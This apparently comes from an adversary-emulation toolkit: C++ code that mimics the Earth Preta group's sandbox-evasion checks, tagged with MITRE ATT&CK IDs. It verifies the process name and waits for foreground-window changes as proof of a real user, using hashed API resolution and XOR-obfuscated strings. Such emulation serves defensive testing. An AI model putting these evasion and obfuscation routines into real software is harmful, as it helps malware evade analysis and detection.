#include "checks.hpp"
#include "handler_util.hpp"

/*
 * VerifyProcessName:
 *      About:
 *          Checks if the current process name matches the target name using the
 *          GetModuleFileNameW API call.
 *      Result:
 *          Returns ERROR_SUCCESS on process name match, otherwise an error code.
 *      MITRE ATT&CK Techniques:
 *          T1497: Virtualization/Sandbox Evasion
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD VerifyProcessName(LPCWSTR desired) {
    GetModuleFileNameW_t fp_GetModuleFileNameW = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetModuleFileNameW);
    if (!fp_GetModuleFileNameW) {
        return FAIL_GET_GETMODULEFILENAMEW;
    }

    GetLastError_t fp_GetLastError = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), GetLastError);
    if (!fp_GetLastError) {
        return FAIL_GET_GETLASTERROR;
    }

    wchar_t buf[MAX_PATH];
    DWORD result = fp_GetModuleFileNameW(NULL, buf, MAX_PATH);
    if (!result) {
        return fp_GetLastError();
    }

    if (FilePathHasLeaf(buf, desired)) {
        return ERROR_SUCCESS;
    } else {
        return PROCESS_NAME_MISMATCH;
    }
}

/*
 * ForegroundWindowCheck:
 *      About:
 *          Waits until the foreground window changes 2 times within the specified
 *          timeout in seconds.
 *      Result:
 *          Returns ERROR_SUCCESS on success, WINDOW_CHECK_TIMEOUT if the specified
 *          time elapses, or otherwise an error code.
 *      MITRE ATT&CK Techniques:
 *          T1497.002: Virtualization/Sandbox Evasion: User Activity Based Checks
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD ForegroundWindowCheck(DWORD timeout) {
    HMODULE h_user32 = LoadLibraryW(XorStringW(L"User32.dll"));
    if (!h_user32) {
        return FAIL_LOAD_USER32;
    }
    GetForegroundWindow_t fp_GetForegroundWindow = RESOLVE_FN_FNV1A_BY_HMODULE(h_user32, GetForegroundWindow);
    if (!fp_GetForegroundWindow) {
        return FAIL_GET_GETFOREGROUNDWINDOW;
    }

    Sleep_t fp_Sleep = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), Sleep);
    if (!fp_Sleep) {
        return FAIL_GET_SLEEP;
    }

    // Check every second if the window changes
    DWORD elapsed = 0;
    DWORD change_count = 0;
    DWORD target_changes = 2;
    HWND h_curr_window = fp_GetForegroundWindow();
    HWND h_new_window;
    do {
        fp_Sleep(1000);
        h_new_window = fp_GetForegroundWindow();
        if (h_new_window != NULL && h_new_window != h_curr_window) {
            h_curr_window = h_new_window;
            if (++change_count >= target_changes) {
                return ERROR_SUCCESS;
            }
        }
    } while(++elapsed < timeout);

    return WINDOW_CHECK_TIMEOUT;
}
